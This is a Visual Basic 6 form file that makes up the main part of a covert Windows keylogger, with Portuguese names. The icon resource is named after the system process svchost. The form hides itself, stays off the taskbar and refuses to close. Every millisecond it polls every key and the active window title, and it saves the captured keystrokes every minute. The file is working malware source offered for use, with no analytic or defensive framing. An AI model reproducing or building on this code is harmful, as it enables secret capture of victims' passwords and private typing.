VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   ClientHeight    =   885
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   1560
   Icon            =   "svchost.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   885
   ScaleWidth      =   1560
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Delays 
      Interval        =   1000
      Left            =   600
      Top             =   120
   End
   Begin VB.Timer Captura 
      Interval        =   1
      Left            =   120
      Top             =   120
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Delays_Timer()
    Delay_SalvarLog = Delay_SalvarLog + 1
    
    Form1.Caption = Delay_SalvarLog
    
    If Delay_SalvarLog >= 60 Then
        Delay_SalvarLog = 0
        If Len(Logger) > 0 Then Call Salvar_Log
    End If
End Sub

Private Sub Form_Load()

    If App.PrevInstance Then End
    Maquina = Environ("COMPUTERNAME")

    Call AddLog("[Keylogger Iniciado com o Windows]" & vbNewLine, 1)
    Me.Visible = False
End Sub

Private Sub Captura_Timer()
    Dim Janela As String
    Janela = GetCaption(GetForegroundWindow)
    
    Dim i As Integer
    For i = 0 To 255
        If VerificaTecla(i) Then
            If Tecla(i) = 0 Then
                Tecla(i) = 1
                Call AddLogger(i)
            End If
        Else
            Tecla(i) = 0
        End If
    Next i
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Cancel = 1
    Call Salvar_Log
End Sub
